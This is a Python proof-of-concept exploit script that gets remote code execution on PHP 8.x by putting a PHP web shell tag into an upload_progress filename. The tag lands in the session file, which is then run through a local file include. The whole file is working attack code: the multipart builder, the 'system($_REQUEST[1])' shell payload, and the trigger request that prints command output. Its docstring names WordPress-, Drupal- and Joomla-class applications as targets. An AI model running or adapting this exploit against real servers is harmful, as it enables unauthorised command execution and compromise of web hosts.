#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
poc_vanilla_rce.py - RCE via upload_progress filename + LFI include().

Works on stock default PHP 8.x (default session codec, upload_progress=On, no
funny INI needed: write payload filename -> include() the saved session file.

Reproduces the classic chain used by the public "session injection + LFI" PoC set
(2026 verified on php:8.4.26-cli official image, default settings).

Concept (why KEY-suffix forge dies but this one lives):

  * KEY forgery dies on the `php` session codec because its map-member key is
    written raw and rejected if it contains `|` (session.c ps_encode_php guard).
  * HUGE FILENAMES land inside serialized VALUES (`s:NN:"<bytes>"`), whose
    format has no pipe guard. A filename shaped like `<?php echo ... ?>` ends up
    byte-verbatim inside the session file, and a later include() of that file
    executes the PHP tags as if they were a template.

Prerequisite for the attacker's side effect to execute: an app with an include()
on a request-controlled path (LFI), i.e. virtually all the CMSes and templates
the leaked PHP2Shell demos targeted (WordPress / Drupal / Joomla class of apps),
or `include $_SESSION[...]`, which is the lab fixture we carry here.

Usage:
  python3 poc_vanilla_rce.py http://HOST:PORT
  (the app uses wp-content.php?page=sess_<SID>&c=id for the trigger)
"""
import argparse, http.client, sys, time

def mpart(fields, files):
    out = b''
    for name, val in fields:
        out += (b'--BND\r\nContent-Disposition: form-data; name="%b"\r\n\r\n'
                % name.encode()) + val + b'\r\n'
    for fld, fname, data in files:
        fn = fname if isinstance(fname, bytes) else fname.encode()
        out += (b'--BND\r\nContent-Disposition: form-data; name="%b"; filename="%b"\r\n\r\n'
                % (fld.encode(), fn)) + data + b'\r\n'
    return out + b'--BND--\r\n'

def req(host, port, method, path, body=None, hdr=None, timeout=30):
    c = http.client.HTTPConnection(host, port, timeout=timeout)
    h = dict(hdr or {})
    if body is not None:
        h['Content-Type'] = 'multipart/form-data; boundary=BND'
        h['Content-Length'] = str(len(body))
    c.request(method, path, body, h)
    r = c.getresponse()
    d = r.read()
    c.close()
    return r.status, d

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('base', help='http://HOST:PORT base URL of the app endpoint')
    ap.add_argument('--cookie-name', default='PHPSESSID')
    ap.add_argument('--sess-dir', default='/tmp/sessions',
                    help='container-side directory where the sess file gets written')
    ap.add_argument('--sid-prefix', default='ph2s_vanilla')
    args = ap.parse_args()

    hostport = args.base.split('://', 1)[-1].rstrip('/')
    if ':' in hostport:
        host, port = hostport.rsplit(':', 1)
        port = int(port)
    else:
        host, port = hostport, 80
    sid = ('%s%d' % (args.sid_prefix[:20].replace('_',''), int(time.time()) % 10**6))[:28]
    sess = '%s/sess_%s' % (args.sess_dir.rstrip('/'), sid)

    cmd_tag = "<?php echo('RCEOUT=');system($_REQUEST[1]);?>"
    cmd = cmd_tag.encode()
    print('[poc] payload filename:', cmd)

    # 1) upload the malicious filename -> lands VERBATIM in sess_<SID>
    body = mpart([('PHPSESSID', sid.encode()),
                  ('PHP_SESSION_UPLOAD_PROGRESS', b'poc')],
                 [('malware', cmd, b'x')])
    st, d = req(host, port, 'POST', '/wp-upload.php', body,
                {'Cookie': '%s=%s' % (args.cookie_name, sid)})
    print('[poc] req1 upload -> HTTP %d body=%s' % (st, d[:100]))

    # 2) include the session file -> PHP executes the tag
    trigger = '/wp-content.php?page=%s&1=id' % sess
    st, body = req(host, port, 'GET', trigger)
    txt = body.decode('latin-1', 'replace')
    print('[poc] req2 include ?page=%s -> HTTP %d (%d bytes)' % (trigger, st, len(body)))
    print('--- body begin ---')
    print(txt[:600])
    print('--- body end ---')
    if 'RCEOUT=' in txt:
        i = txt.index('RCEOUT=')
        print('=== COMMAND OUTPUT ===')
        print(txt[i:i + len('RCEOUT=') + 400])
        print('CHAIN_WORKS')
    else:
        print('CHAIN_BROKEN')

if __name__ == '__main__':
    main()
